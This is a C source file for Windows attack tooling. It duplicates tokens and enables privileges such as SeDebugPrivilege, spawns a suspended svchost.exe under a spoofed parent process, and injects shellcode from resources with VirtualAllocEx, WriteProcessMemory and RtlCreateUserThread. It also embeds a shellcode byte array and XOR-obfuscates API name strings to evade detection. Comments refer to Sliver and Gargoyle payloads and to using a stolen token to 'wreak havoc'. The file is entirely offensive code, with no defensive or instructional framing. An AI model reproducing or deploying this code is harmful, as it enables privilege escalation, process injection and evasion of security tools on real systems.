#include "global.h"


BOOL getToken(HANDLE elevProc) {


	STARTUPINFOA si;
	PROCESS_INFORMATION pi;


	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));


	HANDLE tokenHandle, dupToken = NULL;



	if (!OpenProcessToken(elevProc, TOKEN_QUERY, &tokenHandle)) {
		//printf("fail");
		int lastError = GetLastError();

	}
	void* tokenUser[10240] = { 0 };
	DWORD dwTokeLen = 0;

	if (!GetTokenInformation(tokenHandle, TokenUser, NULL, dwTokeLen, &dwTokeLen));
	{
		int lastError = GetLastError();
		//printf(lastError);
		// Should be a switch, of course. Omitted for brevity
		if (lastError == ERROR_INSUFFICIENT_BUFFER)
		{
			int i = 0;
		}
	}


	WCHAR sturr[] = L"C:\\windows\\system32\\cmd.exe";
	LPWSTR app = &sturr;
	//CreateProcess(dupToken, app, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	CreateProcess(dupToken,
		app,
		NULL,
		NULL,
		FALSE,
		CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		NULL,
		(LPSTARTUPINFO)&si,
		&pi);
	return TRUE;

}

unsigned char payload[] = {

0x6a, 0x60, 0x5a, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54, 0x59, 0x48, 0x29,
0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76, 0x18, 0x48, 0x8b, 0x76,
0x10, 0x48, 0xad, 0x48, 0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57,
0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f, 0x20, 0x48, 0x01, 0xfe,
0x8b, 0x54, 0x1f, 0x24, 0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad,
0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75, 0xef, 0x8b, 0x74, 0x1f,
0x1c, 0x48, 0x01, 0xfe, 0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
0xd7
};



unsigned int payload_len = sizeof(payload);


void encryptDecryptP(char* input, char* key, size_t key_len, size_t data_len) {

	char test;
	char xormod;
	for (int i = 0; i < strlen(input); i++) {

		xormod = key[i % (key_len)];
		test = input[i] ^ xormod;
		if (test != '\0') {
			input[i] = input[i] ^ xormod;
		}
		else {
			//printf("got one %c\n", test);
		}
	}
}


BOOL(WINAPI* pVirtProt)(LPVOID lpAddr, SIZE_T dwS, DWORD flNewProt, PDWORD oldProt);
LPVOID(WINAPI* pvAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
//VOID (WINAPI * rtlMM) (_Out_ VOID UNALIGNED *Destination, _In_  const VOID UNALIGNED *Source,_In_ SIZE_T Length);
HANDLE(WINAPI* pcrThre) (
	LPSECURITY_ATTRIBUTES   lpThreadAttributes,
	SIZE_T                  dwStackSize,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	__drv_aliasesMem LPVOID lpParameter,
	DWORD                   dwCreationFlags,
	LPDWORD                 lpThreadId
	);
FARPROC(WINAPI* pGetProc)(
	HMODULE a,
	LPCSTR  b
	);
LPVOID(WINAPI* pVirtualAllocEx)(
	HANDLE hProcess,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
	);

BOOL(WINAPI* pWriteProcessMemory)(
	HANDLE  hProcess,
	LPVOID  lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T  nSize,
	SIZE_T* lpNumberOfBytesWritten
	);

DWORD(WINAPI* pRtlCreateUserThread)(
	IN HANDLE 					ProcessHandle,
	IN PSECURITY_DESCRIPTOR 	SecurityDescriptor,
	IN BOOL 					CreateSuspended,
	IN ULONG					StackZeroBits,
	IN OUT PULONG				StackReserved,
	IN OUT PULONG				StackCommit,
	IN LPVOID					StartAddress,
	IN LPVOID					StartParameter,
	OUT HANDLE 					ThreadHandle,
	OUT LPVOID					ClientID
	);



int Inject(HANDLE hProc, unsigned char* payload, unsigned int payload_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;
	BOOL bStatus = FALSE;

	pVirtualAllocEx = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "VirtualAllocEx");
	pWriteProcessMemory = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "WriteProcessMemory");
	pRtlCreateUserThread = GetProcAddress(GetModuleHandle(L"Ntdll.dll"), "RtlCreateUserThread");

	pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	if (!pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL)) {
		return;
	}

	bStatus = (BOOL)pRtlCreateUserThread(hProc, NULL, 0, 0, 0, 0, pRemoteCode, NULL, &hThread, NULL);
	//CreateThread(0, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, 0, 0, 0);
	if (bStatus != FALSE) {
		WaitForSingleObject(hThread, -1);
		CloseHandle(hThread);
		return 0;
	}
	else
		return -1;
}




BOOL executeSliv(HANDLE hToken) {


	if (!ImpersonateLoggedOnUser(hToken)) {
		return FALSE;
	}

	void* exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	char key[] = "WaitForSingleObject";

	char getPAddressStr[] = { 0x10, 0x4, 0x1d, 0x24, 0x34, 0x6f, 0x11, 0x12, 0xd, 0xa, 0x15, 0x9, 0x16, 0x3c, 0x0 };
	char virtAllocStr[] = { 0x1, 0x8, 0x1b, 0x74, 0x33, 0xe, 0x1e, 0x12, 0x5, 0x2, 0x8, 0xf, 0x0 };
	//char virtAllocStr[] = "VirtualAlloc";
	char virtProtStr[] = { 0x1, 0x8, 0x1b, 0x74, 0x33, 0xe, 0x1e, 0x3, 0x1b, 0x1, 0x13, 0x9, 0x6, 0x3b, 0x0 };
	char crThrStr[] = { 0x14, 0x13, 0xc, 0x15, 0x32, 0xa, 0x26, 0x3b, 0x1b, 0xb, 0x6, 0x8, 0x0 };

	encryptDecryptP((char*)getPAddressStr, key, sizeof(key), sizeof(getPAddressStr));
	pGetProc = GetProcAddress(GetModuleHandleW(L"Kernel32.dll"), getPAddressStr);

	// Allocate buffer for payload
	//XOR((char*)virtAllocStr, strlen(virtAllocStr), key, sizeof(key));
	encryptDecryptP((char*)virtAllocStr, key, sizeof(key), sizeof(virtAllocStr));
	//GetModuleHandleW("Kernel32.dll")
	pvAlloc = pGetProc(GetModuleHandleW(L"Kernel32.dll"), virtAllocStr);

	//pvAlloc = GetProcAddress(GetModuleHandleW(L"Kernel32.dll"), "VirtualAlloc");

	exec_mem = pvAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	//printf("%-20s : 0x%-016p\n", "sliver_payload addr", (void*)calc_payload);
	//printf("%-20s : 0x%-016p\n", "exec_mem addr", (void*)exec_mem);

	// Copy payload to the buffer
	RtlMoveMemory(exec_mem, payload, payload_len);

	// Make the buffer executable
	//XOR((char*)virtProtStr, strlen(virtProtStr), key, sizeof(key));
	encryptDecryptP((char*)virtProtStr, key, sizeof(key), sizeof(virtProtStr));
	pVirtProt = pGetProc(GetModuleHandleW(L"kernel32.dll"), virtProtStr);
	rv = pVirtProt(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);


	//printf(baseStr);
	// If all good, run the payload
	if (rv != 0) {

		encryptDecryptP((char*)crThrStr, key, sizeof(key), sizeof(crThrStr));
		pcrThre = pGetProc(GetModuleHandleW(L"kernel32.dll"), crThrStr);
		th = pcrThre(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}

	return TRUE;

}



HANDLE fatToke = NULL;

BOOL elevateNInject( HANDLE parentProc,HANDLE debugPp) {

	SIZE_T size = 0x30;

	STARTUPINFOEX si;
	PROCESS_INFORMATION pi;

	RtlSecureZeroMemory(&pi, sizeof(pi));
	RtlSecureZeroMemory(&si, sizeof(si));
	si.StartupInfo.cb = sizeof(STARTUPINFOEX);

	if (size > 1024) { return FALSE; }

	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
		GetProcessHeap(),
		0,
		size
	);
	if (!si.lpAttributeList) { return FALSE; }

	if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) { return FALSE; }
	if (!UpdateProcThreadAttribute(si.lpAttributeList, 0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProc, sizeof(HANDLE), 0, 0)) //-V616
	{
		return FALSE;
	}
	si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
	si.StartupInfo.wShowWindow = SW_SHOW;
	//L"C:\\Windows\\System32\\appverif.exe";
	//L"C:\\Windows\\System32\\eudcedit.exe";
	//L"C:\\Windows\\System32\\fodhelper.exe"
	wchar_t payload[] = L"C:\\Windows\\System32\\svchost.exe";
	if (!CreateProcess(NULL,
		payload,
		NULL,
		NULL,
		TRUE,
		EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_PROCESS_GROUP | CREATE_SUSPENDED,
		NULL,
		NULL,
		(LPSTARTUPINFO)&si,
		&pi))
	{
		return FALSE;
	}




	//Duplicate Process token and use to wreak havoc
	//***************************************************************
	//***************************************************************


	HANDLE token;


	if (!OpenProcessToken(pi.hProcess, TOKEN_ALL_ACCESS, &token))
	{
		return FALSE;
	}

	int privCount = 7;

	PRIVARR tp;
	tp.PrivilegeCount = privCount;
	LUID luid;

	DWORD dError;

	wchar_t* privs[7] = { '\0' };
	privs[0] = L"SeDebugPrivilege";
	privs[1] = L"SeLoadDriverPrivilege";
	privs[2] = L"SeTakeOwnershipPrivilege";
	privs[3] = L"SeBackupPrivilege";
	privs[4] = L"SeImpersonatePrivilege";
	privs[5] = L"SeIncreaseQuotaPrivilege";
	privs[6] = L"SeAssignPrimaryTokenPrivilege";

	//enablePrivs(dupToken, privCount, privs);

	for (int i = 0; i < privCount; i++) {
		if (!LookupPrivilegeValue(
			NULL,            // lookup privilege on local system
			privs[i],   // privilege to lookup 
			&luid))        // receives LUID of privilege
		{
			return FALSE;
		}

		tp.Privileges[i].Luid = luid;
		tp.Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;

	}

	if (!AdjustTokenPrivileges(
		token,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))

	{
		return FALSE;
	}

	HANDLE dupToken = NULL;
	if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &dupToken))
	{
		return FALSE;
	}
	if (!SetThreadToken(NULL, dupToken)) {

		return FALSE;
	}


	HANDLE hProc = pi.hProcess;
	//classicInject(hProc, 106); //inject shellycoat
	classicInject(hProc, 105); //inject arbitrary payload
	

	//spoofParent(hProc);

	//TerminateProcess(parentProc, 0);
	//TerminateProcess(pi.hProcess, 0);
	//spoofParent(pi.hProcess);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	NtClose(parentProc);
	parentProc = NULL;
	NtClose(debugPp);
	debugPp = NULL;

	//if (si.lpAttributeList)
	//	DeleteProcThreadAttributeList(si.lpAttributeList); //dumb empty routine

	//supHeapFree(si.lpAttributeList);

	return TRUE;
}

BOOL spoofParent(HANDLE parent) {


	HANDLE dupHandle = NULL;
	NtDuplicateObject(parent,
		NtCurrentProcess(),
		NtCurrentProcess(),
		&dupHandle,
		PROCESS_ALL_ACCESS,
		0,
		0);

	SIZE_T size = 0x30;
	STARTUPINFOEX si;
	PROCESS_INFORMATION pi;

	RtlSecureZeroMemory(&pi, sizeof(pi));
	RtlSecureZeroMemory(&si, sizeof(si));
	si.StartupInfo.cb = sizeof(STARTUPINFOEX);

	if (size > 1024) { return FALSE; }

	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
		GetProcessHeap(),
		0,
		size
	);

	if (!si.lpAttributeList) { return FALSE; }

	if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) { return FALSE; }
	if (!UpdateProcThreadAttribute(si.lpAttributeList, 0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &dupHandle, sizeof(HANDLE), 0, 0)) //-V616
	{
		return FALSE;
	}
	si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
	si.StartupInfo.wShowWindow = SW_SHOW;
	wchar_t payload[] = L"C:\\Windows\\System32\\svchost.exe";
	if (!CreateProcess(NULL,
		payload,
		NULL,
		NULL,
		TRUE,
		EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		NULL,
		(LPSTARTUPINFO)&si,
		&pi))
	{
		return FALSE;
	}

}


BOOL classicInject(HANDLE hProc,int resource) {

	//"C:\Users\d\MIDNIGHTTRAIN\Bin\gargoyle_x64.bin"
	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;
	BOOL bStatus = FALSE;

	

	void* exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;

	unsigned char* payload1;
	unsigned int payload1_len;

	//// Extract payload from resources section
	//res = FindResource(NULL, MAKEINTRESOURCE(105), L"BIN");
	//resHandle = LoadResource(NULL, res);
	//payload1 = (unsigned char*)LockResource(resHandle);

	//payload1_len = SizeofResource(NULL, res);

	res = FindResource(g_hInstance, MAKEINTRESOURCE(resource), L"BIN"); // substitute RESOURCE_ID and RESOURCE_TYPE.



	resHandle = LoadResource(g_hInstance, res);
	payload1 = (unsigned char*)LockResource(resHandle);

	payload1_len = SizeofResource(g_hInstance, res);

	pVirtualAllocEx = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "VirtualAllocEx");
	pWriteProcessMemory = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "WriteProcessMemory");
	pRtlCreateUserThread = GetProcAddress(GetModuleHandle(L"Ntdll.dll"), "RtlCreateUserThread");

	pRemoteCode = pVirtualAllocEx(hProc, NULL, payload1_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	if (!pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload1, (SIZE_T)payload1_len, (SIZE_T*)NULL)) {
		return FALSE;
	}

	bStatus = pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, &hThread, NULL);

	if (bStatus != FALSE) {
		WaitForSingleObject(hThread, -1);
		CloseHandle(hThread);
		return 0;
	}
	else
		return FALSE;
}

int writeFileToDisk(LPCWSTR lpTempFileName, unsigned char* payload, unsigned int payload_len) {

	HANDLE hFile = CreateFile(lpTempFileName, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	//hFile = CreateFileW(lpTempFileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		//PrintError(TEXT("Second CreateFile failed"));
		if (!CloseHandle(hFile))
		{
			//PrintError(TEXT("CloseHandle(hFile) failed"));
			return (7);
		}
		return (2);
	}
	DWORD dwWritten = 0;

	//copy to byte array

	//unsigned char* bytes = supHeapAlloc(payload_len);
	////unsigned char* bytes = new unsigned char[dwSize];
	//memcpy(bytes, payload, payload_len);

	//unsigned int len = sizeof(bytes);

	//WriteF
	if (!WriteFile(hFile, payload, payload_len, &dwWritten, NULL)) {
		if (!CloseHandle(hFile))
		{
			//PrintError(TEXT("CloseHandle(hFile) failed")); 
			return (7);
		}
		return 3;
	}

	CloseHandle(hFile);
}
